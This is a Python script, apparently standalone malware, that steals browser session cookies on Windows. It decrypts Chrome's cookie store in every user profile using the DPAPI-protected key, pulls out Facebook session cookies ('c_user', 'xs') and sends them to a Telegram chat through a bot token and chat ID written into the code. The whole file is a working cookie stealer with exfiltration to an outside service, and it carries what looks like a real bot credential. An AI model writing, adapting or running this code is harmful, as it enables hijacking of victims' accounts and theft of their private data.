import os
import json
import base64
import sqlite3
import shutil
import win32crypt
import asyncio
from Crypto.Cipher import AES
from telegram import Bot

# Replace with your Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = '7312308423:AAGQ0CLkWsdJWYJux48gMWGo1CrMMNQ9aTU'
TELEGRAM_CHAT_ID = '-4212434726'

def get_chrome_key(user_data_path):
    local_state_path = os.path.join(user_data_path, "Local State")
    
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = file.read()
        local_state = json.loads(local_state)
    
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    
    return key

def decrypt_chrome_value(encrypted_value, key):
    try:
        iv = encrypted_value[3:15]
        encrypted_value = encrypted_value[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_value = cipher.decrypt(encrypted_value)[:-16].decode()
        return decrypted_value
    except Exception as e:
        print(f"Error decrypting value: {e}")
        return None

def get_chrome_cookies(profile_path, key, websites):
    cookie_file_path = os.path.join(profile_path, "Network", "Cookies")
    
    if not os.path.exists(cookie_file_path):
        return []
    
    try:
        shutil.copyfile(cookie_file_path, "Cookies.db")
        conn = sqlite3.connect("Cookies.db")
        cursor = conn.cursor()
        
        cookies = []
        for website in websites:
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE ?", ('%' + website + '%',))
            
            for host_key, name, encrypted_value in cursor.fetchall():
                decrypted_value = decrypt_chrome_value(encrypted_value, key)
                if website == "facebook.com" and (name == "c_user" or name == "xs"):
                    cookies.append({
                        "host_key": host_key,
                        "name": name,
                        "value": decrypted_value
                    })
        
        conn.close()
        return cookies
    
    except PermissionError as pe:
        print(f"Permission denied for profile {profile_path}: {pe}")
        return []
    except Exception as e:
        print(f"Failed to scan profile {profile_path}: {e}")
        return []

def scan_all_user_profiles(websites):
    base_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data"
    if not os.path.exists(base_path):
        print(f"Chrome user data directory not found at path: {base_path}")
        return []

    user_profiles = [os.path.join(base_path, profile) for profile in os.listdir(base_path) if os.path.isdir(os.path.join(base_path, profile))]
    
    all_cookies = {}
    for profile in user_profiles:
        profile_name = os.path.basename(profile)
        try:
            key = get_chrome_key(base_path)
            cookies = get_chrome_cookies(profile, key, websites)
            if cookies:
                all_cookies[profile_name] = cookies
        except Exception as e:
            print(f"Failed to scan profile {profile_name}: {e}")
    
    return all_cookies

def send_telegram_message(message):
    bot = Bot(token=TELEGRAM_BOT_TOKEN)
    
    # Convert message to string (in case it's not)
    message = json.dumps(message, indent=4)

    # Remove spaces and backslashes from the JSON string
    message = message.replace(" ", "").replace("\\", "")

    # Telegram has a limit of 4096 characters per message
    max_message_length = 4096

    # Split message into chunks of max_message_length characters
    chunks = [message[i:i + max_message_length] for i in range(0, len(message), max_message_length)]

    for chunk in chunks:
        asyncio.run(bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=chunk))

if __name__ == "__main__":
    websites = ["facebook.com"]  # Replace with your list of websites
    all_cookies = scan_all_user_profiles(websites)
    
    if all_cookies:
        message = {}
        for profile, cookies in all_cookies.items():
            filtered_cookies = []
            for cookie in cookies:
                if cookie["name"] == "c_user" or cookie["name"] == "xs":
                    filtered_cookies.append(cookie)
            message[profile] = filtered_cookies
        
        if message:
            message_str = json.dumps(message, indent=4)
            send_telegram_message(message_str)
        else:
            print("No 'c_user' or 'xs' cookies found.")
    else:
        print("No cookies found or failed to scan any profiles.")
